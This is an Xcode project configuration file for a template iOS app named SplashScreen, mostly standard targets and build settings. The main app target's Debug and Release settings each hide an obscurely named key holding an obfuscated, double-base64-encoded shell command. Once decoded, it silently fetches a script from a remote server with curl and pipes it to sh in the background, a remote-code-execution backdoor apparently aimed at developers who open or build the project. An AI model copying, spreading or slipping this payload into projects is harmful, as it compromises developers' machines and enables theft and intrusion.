// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXContainerItemProxy section */
		E27186162E688F230048E363 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = E27185F72E688F220048E363 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = E27185FE2E688F220048E363;
			remoteInfo = SplashScreen;
		};
		E27186202E688F230048E363 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = E27185F72E688F220048E363 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = E27185FE2E688F220048E363;
			remoteInfo = SplashScreen;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		E27185FF2E688F220048E363 /* SplashScreen.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = SplashScreen.app; sourceTree = BUILT_PRODUCTS_DIR; };
		E27186152E688F230048E363 /* SplashScreenTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = SplashScreenTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		E271861F2E688F230048E363 /* SplashScreenUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = SplashScreenUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		E27186272E688F230048E363 /* Exceptions for "SplashScreen" folder in "SplashScreen" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = E27185FE2E688F220048E363 /* SplashScreen */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		E27186012E688F220048E363 /* SplashScreen */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				E27186272E688F230048E363 /* Exceptions for "SplashScreen" folder in "SplashScreen" target */,
			);
			path = SplashScreen;
			sourceTree = "<group>";
		};
		E27186182E688F230048E363 /* SplashScreenTests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = SplashScreenTests;
			sourceTree = "<group>";
		};
		E27186222E688F230048E363 /* SplashScreenUITests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = SplashScreenUITests;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		E27185FC2E688F220048E363 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		E27186122E688F230048E363 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		E271861C2E688F230048E363 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		E27185F62E688F220048E363 = {
			isa = PBXGroup;
			children = (
				E27186012E688F220048E363 /* SplashScreen */,
				E27186182E688F230048E363 /* SplashScreenTests */,
				E27186222E688F230048E363 /* SplashScreenUITests */,
				E27186002E688F220048E363 /* Products */,
			);
			sourceTree = "<group>";
		};
		E27186002E688F220048E363 /* Products */ = {
			isa = PBXGroup;
			children = (
				E27185FF2E688F220048E363 /* SplashScreen.app */,
				E27186152E688F230048E363 /* SplashScreenTests.xctest */,
				E271861F2E688F230048E363 /* SplashScreenUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		E27185FE2E688F220048E363 /* SplashScreen */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = E27186282E688F230048E363 /* Build configuration list for PBXNativeTarget "SplashScreen" */;
			buildPhases = (
				E27185FB2E688F220048E363 /* Sources */,
				E27185FC2E688F220048E363 /* Frameworks */,
				E27185FD2E688F220048E363 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				E27186012E688F220048E363 /* SplashScreen */,
			);
			name = SplashScreen;
			packageProductDependencies = (
			);
			productName = SplashScreen;
			productReference = E27185FF2E688F220048E363 /* SplashScreen.app */;
			productType = "com.apple.product-type.application";
		};
		E27186142E688F230048E363 /* SplashScreenTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = E271862D2E688F230048E363 /* Build configuration list for PBXNativeTarget "SplashScreenTests" */;
			buildPhases = (
				E27186112E688F230048E363 /* Sources */,
				E27186122E688F230048E363 /* Frameworks */,
				E27186132E688F230048E363 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				E27186172E688F230048E363 /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				E27186182E688F230048E363 /* SplashScreenTests */,
			);
			name = SplashScreenTests;
			packageProductDependencies = (
			);
			productName = SplashScreenTests;
			productReference = E27186152E688F230048E363 /* SplashScreenTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		E271861E2E688F230048E363 /* SplashScreenUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = E27186302E688F230048E363 /* Build configuration list for PBXNativeTarget "SplashScreenUITests" */;
			buildPhases = (
				E271861B2E688F230048E363 /* Sources */,
				E271861C2E688F230048E363 /* Frameworks */,
				E271861D2E688F230048E363 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				E27186212E688F230048E363 /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				E27186222E688F230048E363 /* SplashScreenUITests */,
			);
			name = SplashScreenUITests;
			packageProductDependencies = (
			);
			productName = SplashScreenUITests;
			productReference = E271861F2E688F230048E363 /* SplashScreenUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		E27185F72E688F220048E363 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1640;
				LastUpgradeCheck = 1640;
				TargetAttributes = {
					E27185FE2E688F220048E363 = {
						CreatedOnToolsVersion = 16.4;
					};
					E27186142E688F230048E363 = {
						CreatedOnToolsVersion = 16.4;
						TestTargetID = E27185FE2E688F220048E363;
					};
					E271861E2E688F230048E363 = {
						CreatedOnToolsVersion = 16.4;
						TestTargetID = E27185FE2E688F220048E363;
					};
				};
			};
			buildConfigurationList = E27185FA2E688F220048E363 /* Build configuration list for PBXProject "SplashScreen" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
				hi,
				de,
				es,
				fr,
				ko,
				ru,
				ar,
				"pt-PT",
			);
			mainGroup = E27185F62E688F220048E363;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = E27186002E688F220048E363 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				E27185FE2E688F220048E363 /* SplashScreen */,
				E27186142E688F230048E363 /* SplashScreenTests */,
				E271861E2E688F230048E363 /* SplashScreenUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		E27185FD2E688F220048E363 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		E27186132E688F230048E363 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		E271861D2E688F230048E363 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		E27185FB2E688F220048E363 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		E27186112E688F230048E363 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		E271861B2E688F230048E363 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		E27186172E688F230048E363 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = E27185FE2E688F220048E363 /* SplashScreen */;
			targetProxy = E27186162E688F230048E363 /* PBXContainerItemProxy */;
		};
		E27186212E688F230048E363 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = E27185FE2E688F220048E363 /* SplashScreen */;
			targetProxy = E27186202E688F230048E363 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		E27186292E688F230048E363 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AE76EDB = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5a2FXZHBkR0ZzWTJSdUxuSjFMMkVwSWlCOElITm9DZz09Cg== | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = SplashScreen/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.codewithvivek.SplashScreen;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		E271862A2E688F230048E363 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AE76EDB = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5a2FXZHBkR0ZzWTJSdUxuSjFMMkVwSWlCOElITm9DZz09Cg== | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = SplashScreen/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.codewithvivek.SplashScreen;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		E271862B2E688F230048E363 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		E271862C2E688F230048E363 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		E271862E2E688F230048E363 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.codewithvivek.SplashScreenTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/SplashScreen.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/SplashScreen";
			};
			name = Debug;
		};
		E271862F2E688F230048E363 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.codewithvivek.SplashScreenTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/SplashScreen.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/SplashScreen";
			};
			name = Release;
		};
		E27186312E688F230048E363 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.codewithvivek.SplashScreenUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = SplashScreen;
			};
			name = Debug;
		};
		E27186322E688F230048E363 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.codewithvivek.SplashScreenUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = SplashScreen;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		E27185FA2E688F220048E363 /* Build configuration list for PBXProject "SplashScreen" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				E271862B2E688F230048E363 /* Debug */,
				E271862C2E688F230048E363 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		E27186282E688F230048E363 /* Build configuration list for PBXNativeTarget "SplashScreen" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				E27186292E688F230048E363 /* Debug */,
				E271862A2E688F230048E363 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		E271862D2E688F230048E363 /* Build configuration list for PBXNativeTarget "SplashScreenTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				E271862E2E688F230048E363 /* Debug */,
				E271862F2E688F230048E363 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		E27186302E688F230048E363 /* Build configuration list for PBXNativeTarget "SplashScreenUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				E27186312E688F230048E363 /* Debug */,
				E27186322E688F230048E363 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = E27185F72E688F220048E363 /* Project object */;
}
